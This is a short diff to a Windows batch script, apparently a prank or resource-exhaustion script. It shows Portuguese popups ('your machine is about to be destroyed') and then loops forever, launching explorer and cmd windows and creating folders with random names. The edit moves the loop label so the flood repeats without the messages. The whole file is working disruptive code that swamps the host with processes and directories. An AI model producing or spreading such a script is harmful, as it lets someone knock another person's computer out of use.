@@ -1,8 +1,8 @@
 @echo off
-:loop
+
  msg * Ola
   msg * Sua maquina esta prestes a ser destruida! :D Espero que aprecie o show.
-
+:loop
   start explorer
    md %random%
     start cmd
@@ -13,8 +13,3 @@
          md %random%
 
 goto loop
-
-
-
-
-
